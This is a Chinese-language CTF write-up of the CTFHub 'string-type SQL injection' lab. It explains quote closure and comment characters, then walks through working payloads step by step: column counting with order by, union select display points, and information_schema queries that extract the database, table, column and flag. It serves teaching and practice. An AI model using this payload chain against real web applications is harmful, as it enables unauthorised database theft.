【CTFHub】Web-SQL注入字符型 Writeup

操作者：何芊宏 | 操作日期：2026.9.23 | 分类：CTF | 标签：CTFHub, Web, SQL注入, 字符型, 引号闭合, 注释符, Union联合查询

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - SQL注入 / 字符型注入
  • 题目名称：字符型注入
  • 环境：通过 Open Browser 打开外部浏览器访问靶场环境。
  • 目标：页面提供 ID 输入框，后端直接将输入拼接到 SQL 语句中，参数被单引号包裹。需要闭合引号、注释多余代码，利用联合查询获取 Flag。

2. 解题思路与知识点

字符型注入原理：后端接收参数后，未进行严格过滤，直接将输入拼接进 SQL 语句。由于参数被单引号 ' 包裹，注入时必须先闭合引号，再用注释符 # 或 --+ 注释掉原代码尾部多余的引号，从而构造出合法的 SQL 语句。

核心逻辑：单引号必须成对出现（闭合原理）

通过探测，后端拼接逻辑可抽象为：WHERE id = '[输入]'

  • 输入 1：拼接为 WHERE id = '1'，2个单引号，完美配对，正常执行。
  • 输入 1'：拼接为 WHERE id = '1''，总共出现3个单引号，导致最后一个无法配对，语法解析失败，页面报错/空白。
  • 输入 1' and '1'='1：拼接为 WHERE id = '1' and '1'='1'，4个单引号，完美配对（原码头配输入头，输入的第二个引号与尾部的引号配对），逻辑为真，页面恢复正常。
  • 注释的作用（#）：在构造复杂Payload时，直接输入尾部会有原代码多出的单引号，加上 # 将其注释掉，就能保障我们构造的语句不会因单引号未闭合而崩溃。
整数型 vs 字符型 核心对比：
  • 相同点：漏洞本质相同（拼接执行），脱库流程完全一致（判断列数 -> 找回显点 -> 查 information_schema 库）。
  • 不同点（核心）：
    • 拼接形式：整数型无引号（id=1）；字符型有引号（id='1'）。
    • 闭合要求：整数型直接输入；字符型必须用 ' 闭合前面的引号。
    • 尾部处理：整数型不需要处理；字符型必须使用 # 或 --+ 注释掉尾随的引号。
    • 探测 Payload：整数型 1 and 1=1；字符型 1' and '1'='1。

3. 操作步骤

第一步：漏洞探测（判断存在字符型注入）

  • 输入 1：回显 select * from news where id='1'，结果正常。
  • 输入 1'：回显 select * from news where id='1''，页面报错/空白。说明多出来的单引号破坏了SQL语法。

结论：确认为字符型注入。输入的 ' 成功闭合了原语句的 id='。

第二步：闭合验证与逻辑测试

  • 输入 1' and '1'='1：页面正常显示数据（逻辑为真）。
  • 输入 1' and '1'='2：页面无数据/空白（逻辑为假）。

结论：确认注入条件被执行，我们成功控制了查询逻辑。

第三步：注释尾随单引号（关键步骤）

输入 1' #，页面正常显示数据。

原理：# 将原代码尾部多出来的单引号注释掉，使我们后续构造的 Payload 不会被破坏。在 URL 中，空格会被编码为 +，# 会被编码为 %23（例如 1%27+%23）。备选方案是 1' --+。

第四步：判断字段数（列数）

  • 输入 1' order by 2 #：页面正常回显。
  • 输入 1' order by 3 #：页面无数据回显。

结论：当前表有 2 个字段。

第五步：寻找黄金回显点

输入 -1' union select 1,2 #，页面回显 ID: 1，Data: 2。

原理解析：-1 使前半句查询为空，union select 1,2 将结果拼接到2列中，数字 1 和 2 成功在页面回显。

第六步：联合查询脱库

利用回显点，查询库名、表名、字段名和数据：

  • 查库名：输入 -1' union select 1,database() #，回显 Data: sqli。确定当前数据库为 sqli。
  • 查表名：输入 -1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，回显 Data: flag,news。发现目标表 flag。
  • 查字段名：输入 -1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #，回显 Data: flag。确定字段名为 flag。
  • 获取数据：输入 -1' union select 1,flag from flag #，成功获得最终Flag并提交。

4. 踩坑记录与复盘

  • 坑1：为什么 1' 会报错？因为添加的单引号导致 SQL 语句中的单引号变成了奇数个，无法成对配对，语法解析失败。
  • 坑2：为什么 1' and '1'='1 又能正常？因为补全的新语句刚好与原有的单引号凑成了偶数个，完美闭合。这说明我们成功操控了闭合并注入了逻辑代码。
  • 坑3：尾随单引号问题。字符型注入必须使用 # 或 --+ 注释掉原代码尾部多余的单引号，否则无法构造复杂的 Payload（如联合查询）。
  • 为什么必须用-1：联合查询必须保证前后列数一致（这里为2列）。用不存在的 -1 能让前半句查询失败，强制页面显示我们注入的 select 1,2 结果。

5. 知识总结

  • 字符型注入标准流程：探测报错（输入 '） -> 验证逻辑（' and '1'='1） -> 闭合注释（' #） -> 判断列数（order by） -> 找回显位置（union select） -> 查库名、表名、字段名 -> 脱取数据。
  • 注释符的使用：# 和 --+（URL 编码后）是字符型注入中必不可少的工具。
  • 系统库信息：熟练记忆 database() 函数，以及 information_schema.tables 和 information_schema.columns 这两张核心表。
